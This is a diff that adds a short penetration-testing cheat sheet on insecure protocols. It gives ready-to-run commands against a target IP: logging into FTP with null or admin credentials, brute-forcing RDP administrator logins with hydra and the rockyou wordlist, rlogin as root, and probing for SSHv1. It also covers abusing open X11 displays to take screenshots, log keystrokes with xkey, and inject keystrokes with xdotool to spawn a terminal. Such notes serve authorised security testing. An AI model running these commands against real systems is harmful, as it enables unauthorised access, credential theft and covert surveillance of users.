@@ -1,0 +1,77 @@
+Insecure Protocols
+
+
+# FTP access with admin/null credentials
+
+ftp admin@<target IP>
+user
+admin
+pwd
+
+telnet <target IP> 21
+user admin
+pass
+id;
+------------------------------------------------------------------------------------------------------
+
+# FTP on non-standard port
+
+ftp <target IP> <port>
+------------------------------------------------------------------------------------------------------
+
+# FTP server does not support AUTH command
+
+telnet <target IP> 21
+AUTH test
+------------------------------------------------------------------------------------------------------
+
+# Remote Desktop
+
+hydra -t 4 -V -l administrator -P /usr/share/wordlists/rockyou.txt rdp://targetIP
+------------------------------------------------------------------------------------------------------
+
+# Rservices
+
+513/tcp
+apt-get install rsh-client
+rlogin -l root <target IP>
+------------------------------------------------------------------------------------------------------
+
+# SSH Protocol v1
+
+nmap -Pn -n -T4 -p22 --script=sshv1 <target IP>
+
+ssh -1 <target IP>
+------------------------------------------------------------------------------------------------------
+
+# X11
+
+nmap -Pn -n -T4 -p6000-6010 --script=x11-access <target IP>
+
+xspy <target IP>
+
+OS X
+     Screenshot:
+     xwd -display <targetIP>:<display> -root -out file.xwd
+
+     View screenshot:
+     xwud -in file.xwd
+
+     Key logging:
+     xkey <targetIP>:0.0 
+
+     xdotool inject:
+     Open another Terminal and type:
+
+     export DISPLAY=<ipaddress>:0
+
+     $ xdotool key x t e r m
+     $ xdotool key KP_Enter
+
+     Might need to inject 1 char at a time:
+
+     xdotool key x 
+     xdotool key t
+     xdotool key e
+     xdotool key r 
+     xdotool key m
